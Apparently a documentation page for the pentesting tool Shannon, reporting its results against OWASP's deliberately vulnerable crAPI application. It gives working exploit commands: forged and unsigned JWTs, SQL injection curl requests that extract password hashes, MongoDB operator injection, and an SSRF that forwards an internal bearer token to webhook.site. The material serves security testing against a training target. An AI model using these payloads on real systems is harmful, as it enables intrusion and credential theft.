@@ -1,0 +1,362 @@
+---
+title: OWASP crAPI Report
+description: Shannon discovered 15+ critical vulnerabilities including advanced JWT attacks and complete database compromise
+---
+
+## Executive Summary
+
+**Target**: OWASP crAPI ([GitHub](https://github.com/OWASP/crAPI))  
+**Assessment Date**: September 2025  
+**Scope**: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing
+
+Shannon identified **over 15 critical and high-severity vulnerabilities**, achieving full application compromise of crAPI, a modern intentionally vulnerable API from OWASP designed to benchmark tools against the OWASP API Security Top 10.
+
+## Key Accomplishments
+
+### Complete Application Compromise
+
+- **Bypassed authentication using multiple advanced JWT attacks**: Algorithm confusion, alg:none, and weak key (kid) injection
+- **Achieved full database compromise via injection attacks**: Exfiltrated user credentials from PostgreSQL database
+- **Executed critical Server-Side Request Forgery (SSRF)**: Successfully forwarded internal authentication tokens to external service
+- **Demonstrated high accuracy**: Correctly identified robust XSS defenses with zero false positives
+
+### Verified Vulnerabilities by Category
+
+**Authentication Vulnerabilities:**
+- JWT algorithm confusion attacks (RS256 to HS256)
+- Unsigned JWT token acceptance (alg:none bypass)
+- JWT JKU header SSRF exploitation
+- JWT KID header injection with weak key exploitation
+- Unlimited brute force capabilities (login and OTP endpoints)
+
+**Authorization Vulnerabilities:**
+- Unauthenticated access to sensitive order data with payment information
+- Horizontal privilege escalation between user accounts
+- Regular users accessing mechanic-only functionality
+- Business logic bypasses for unlimited store credit accumulation
+
+**Cross-Site Scripting (XSS):**
+- **No XSS vulnerabilities found** - Application code analysis identified potential sinks but exploitation blocked by input validation and framework protections
+
+**SQL/Command Injection:**
+- PostgreSQL SQL injection in coupon validation endpoint
+- Complete database compromise with credential extraction
+- MongoDB NoSQL injection bypassing query filters
+- Command injection in video processing (internal network protected)
+
+**Server-Side Request Forgery (SSRF):**
+- Critical SSRF through contact mechanic endpoint
+- Complete internal network access with credential theft
+- Retry mechanism for persistent attacks
+- Authorization header forwarding to external services
+
+## Critical Vulnerability Examples
+
+### AUTH-VULN-04: JWT Algorithm Confusion Attack (RS256 to HS256)
+
+**Severity**: Critical  
+**Location**: JWT validation in `services/identity/src/main/java/com/crapi/config/JwtProvider.java`  
+**Impact**: Complete authentication bypass with admin privilege escalation
+
+**Prerequisites**: Access to RSA public key from `/.well-known/jwks.json`
+
+**Exploitation:**
+
+1. Extract RSA public key from JWKS endpoint:
+
+```bash
+curl -k "https://crapi.sandbox.local:8888/.well-known/jwks.json"
+```
+
+2. Obtain legitimate JWT token by logging in as `test@example.com / Test!123`
+
+3. Create forged JWT token using algorithm confusion:
+   - Change header algorithm from `"alg": "RS256"` to `"alg": "HS256"`
+   - Modify payload role from `"role": "user"` to `"role": "admin"`
+   - Change subject from `test@example.com` to `admin@example.com`
+   - Sign using HMAC-SHA256 with RSA public key as secret
+
+4. Test forged token against dashboard endpoint:
+
+```bash
+curl -k -H "Authorization: Bearer [FORGED_TOKEN]" \
+  "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
+```
+
+**Proof of Impact:**
+
+- **Original token**: User access to `test@example.com` account
+- **Forged token**: Admin access to `admin@example.com` account with elevated privileges
+- Response included sensitive admin dashboard data confirming privilege escalation
+
+**Technical Details**: Python script `/source/jwt_algorithm_confusion_attack.py` demonstrates complete attack chain with 100% success rate. The vulnerability exists because the application accepts JWT tokens signed with HMAC (HS256) when it expects RSA (RS256), allowing attackers to use the public key (which is publicly available) as the HMAC secret.
+
+---
+
+### AUTH-VULN-05: JWT 'None' Algorithm Authentication Bypass
+
+**Severity**: Critical  
+**Location**: JWT validation accepts unsigned tokens with `"alg": "none"`  
+**Impact**: Full access to admin account without any cryptographic verification
+
+**Prerequisites**: None
+
+**Exploitation:**
+
+1. Create unsigned JWT token with admin privileges:
+   - Header: `{"alg": "none"}`
+   - Payload: `{"sub": "admin@example.com", "iat": 1758655244, "exp": 1759260044, "role": "admin"}`
+   - Signature: Empty (unsigned token format: `header.payload.`)
+
+2. Test unsigned token:
+
+```bash
+curl -k -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTI0NCwiZXhwIjoxNzU5MjYwMDQ0LCJyb2xlIjoiYWRtaW4ifQ." \
+  "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
+```
+
+**Proof of Impact:**
+
+- HTTP 200 response with full admin dashboard access
+- Retrieved sensitive admin account information including credentials
+- Complete bypass of all authentication mechanisms
+
+**Technical Details**: The application accepts JWT tokens with `alg:none`, which means no signature verification is performed. This completely bypasses authentication by allowing anyone to craft arbitrary tokens with any claims.
+
+---
+
+### AUTH-VULN-06: JWT JKU Header SSRF Exploitation
+
+**Severity**: High  
+**Location**: JKU header processing in JWT validation  
+**Impact**: Internal network reconnaissance and potential cloud metadata access
+
+**Prerequisites**: Ability to craft JWT tokens with JKU headers
+
+**Exploitation:**
+
+1. Create JWT with malicious JKU header pointing to internal resources:
+
+```json
+{
+  "alg": "RS256",
+  "jku": "http://192.168.1.1/admin",
+  "typ": "JWT"
+}
+```
+
+2. Test internal network access:
+   - `http://192.168.1.1/admin` (10.0s timeout - confirms internal network access)
+   - `http://10.0.0.1/status` (10.3s timeout - confirms internal routing)
+   - `http://172.16.0.1/health` (10.3s timeout - confirms private IP access)
+
+**Proof of Impact:**
+
+- Confirmed SSRF capability through timeout analysis
+- Server makes HTTP requests to attacker-controlled URLs
+- Internal network ranges (RFC 1918) are accessible
+- Potential for cloud metadata service access (169.254.169.254)
+
+**Technical Details**: The JKU (JSON Web Key URL) header tells the server where to fetch the public key for signature verification. By controlling this URL, attackers can force the server to make requests to internal resources.
+
+---
+
+### INJ-VULN-03: PostgreSQL SQL Injection via Coupon Validation
+
+**Severity**: Critical  
+**Location**: `/workshop/api/shop/apply_coupon` endpoint, `coupon_code` parameter  
+**Impact**: Full database compromise with extraction of user credentials
+
+**Prerequisites**: Valid JWT authentication token
+
+**Exploitation:**
+
+1. Authenticate and obtain JWT token:
+
+```bash
+curl -k -X POST https://crapi.sandbox.local:8888/identity/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": "admin@example.com", "password": "Admin!123"}'
+```
+
+2. Confirm SQL injection vulnerability:
+
+```bash
+curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
+  -H "Authorization: Bearer [JWT_TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"coupon_code": "'\'' OR 1=1--", "amount": 100}'
+```
+
+3. Extract database version information:
+
+```bash
+curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
+  -H "Authorization: Bearer [JWT_TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT version()--", "amount": 100}'
+```
+
+Response: `PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1) on x86_64-pc-linux-gnu`
+
+4. Extract sensitive user credentials:
+
+```bash
+curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
+  -H "Authorization: Bearer [JWT_TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT email||'\'':\'\''||password FROM user_login LIMIT 5--", "amount": 100}'
+```
+
+Response: `test6@test.com:$2a$10$TwbchLEy4653ENobgxRKjemiHlnQE98CPncJYVhFeIfCLeicefAPG`
+
+**Proof of Impact:**
+
+- **Database Version Extracted**: PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1)
+- **Database User**: admin (high privileges)
+- **Database Name**: crapi
+- **Complete Table Enumeration**: 25 tables including sensitive user data
+- **Password Hash Extracted**: BCrypt hashes from user_login table
+
+**Technical Details**: UNION-based SQL injection allows complete database enumeration and data extraction. The application does not properly sanitize the `coupon_code` parameter before using it in SQL queries.
+
+---
+
+### INJ-VULN-04: MongoDB NoSQL Injection via Community Coupon Validation
+
+**Severity**: High  
+**Location**: `/community/api/v2/coupon/validate-coupon` endpoint  
+**Impact**: Unauthorized access to MongoDB coupon collection
+
+**Prerequisites**: Valid JWT authentication token
+
+**Exploitation:**
+
+1. Test basic endpoint functionality:
+
+```bash
+curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
+  -H "Authorization: Bearer [JWT_TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"coupon_code": "test"}'
+```
+
+Response: `{}` (empty object for non-existent coupon)
+
+2. Exploit with $ne operator to extract data:
+
+```bash
+curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
+  -H "Authorization: Bearer [JWT_TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"coupon_code": {"$ne": null}}'
+```
+
+Response: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`
+
+3. Verify with regex operator:
+
+```bash
+curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
+  -H "Authorization: Bearer [JWT_TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"coupon_code": {"$regex": "^."}}'
+```
+
+**Proof of Impact:**
+
+- **Complete MongoDB Query Manipulation**: Successfully bypassed all query filters using MongoDB operators
+- **Sensitive Data Extracted**: Coupon code TRAC075 with value $75
+- **Multiple Injection Vectors Confirmed**: $ne, $regex, and $gt operators all successful
+- **Business Logic Bypass**: Access arbitrary coupons without knowing valid codes
+
+**Technical Details**: The application accepts JSON objects in the `coupon_code` parameter and passes them directly to MongoDB queries, allowing operator injection.
+
+---
+
+### SSRF-VULN-01: Critical SSRF via Contact Mechanic Endpoint
+
+**Severity**: Critical  
+**Location**: `/workshop/api/merchant/contact_mechanic` endpoint  
+**Impact**: Complete internal network access with credential theft capabilities
+
+**Prerequisites**: Valid JWT authentication token
+
+**Exploitation:**
+
+1. Test SSRF by forwarding request to external webhook:
+
+```bash
+curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/merchant/contact_mechanic \
+  -H "Authorization: Bearer [JWT_TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "mechanic_code": "TRAC_MEC_1",
+    "problem_details": "test",
+    "mechanic_api": "https://webhook.site/[YOUR-ID]",
+    "repeat_request_if_failed": false
+  }'
+```
+
+2. Observe external request with forwarded Authorization header:
+
+```
+POST / HTTP/1.1
+Host: webhook.site
+Authorization: Bearer [INTERNAL_SERVICE_TOKEN]
+Content-Type: application/json
+
+{"problem_details": "test", "mechanic_code": "TRAC_MEC_1"}
+```
+
+**Proof of Impact:**
+
+- Server makes POST requests to attacker-controlled URLs
+- **Authorization headers forwarded to external services** (critical credential theft)
+- Retry mechanism (`repeat_request_if_failed`) enables persistent attacks
+- Complete control over HTTP method, headers, and body
+- Access to internal services and cloud metadata endpoints
+
+**Technical Details**: The `mechanic_api` parameter accepts arbitrary URLs and the server makes requests to those URLs with internal authentication credentials. The `repeat_request_if_failed` parameter can be used for brute force attacks or persistent exploitation.
+
+## XSS Defense Validation
+
+Shannon correctly identified that the application has **robust XSS defenses**:
+
+- Input validation blocks malicious payloads
+- Framework-level protections (React, Django) prevent injection
+- Proper output encoding applied consistently
+
+**Zero false positives reported** - Shannon only reports vulnerabilities it can successfully exploit.
+
+## Report Access
+
+View the complete penetration test report with all vulnerability details:
+
+[View Full Report →](https://github.com/KeygraphHQ/shannon/blob/main/sample-reports/shannon-report-crapi.md)
+
+## Application Details
+
+**OWASP crAPI** (Completely Ridiculous API) is a modern intentionally vulnerable API application from OWASP designed to benchmark security tools against the OWASP API Security Top 10.
+
+- **GitHub**: [OWASP/crAPI](https://github.com/OWASP/crAPI)
+- **Purpose**: API security testing and training
+- **Technology**: Java Spring Boot, Python Flask, React, PostgreSQL, MongoDB
+- **Focus**: OWASP API Security Top 10 vulnerabilities
+
+## Key Takeaways
+
+Shannon's performance on crAPI demonstrates:
+
+1. **Advanced Authentication Testing**: Successfully exploited multiple JWT attack vectors including algorithm confusion, alg:none, JKU header SSRF, and KID header injection
+2. **Multi-Database Coverage**: Exploited both SQL (PostgreSQL) and NoSQL (MongoDB) injection vulnerabilities
+3. **Critical SSRF Discovery**: Found SSRF with credential theft capability through contact mechanic endpoint
+4. **Zero False Positives**: Correctly identified robust XSS defenses without false reports
+5. **Complete Database Compromise**: Extracted user credentials and system information through injection attacks
+
+## Next Steps
+
+- [View OWASP Juice Shop Report](/reports/juice-shop): Web application vulnerability coverage
+- [View c{api}tal API Report](/reports/capital-api): API security testing including command injection
+- [View Benchmark Results](/reports/benchmark-results): Quantitative performance analysis
+- [Get Started with Shannon](/quickstart): Test your own applications
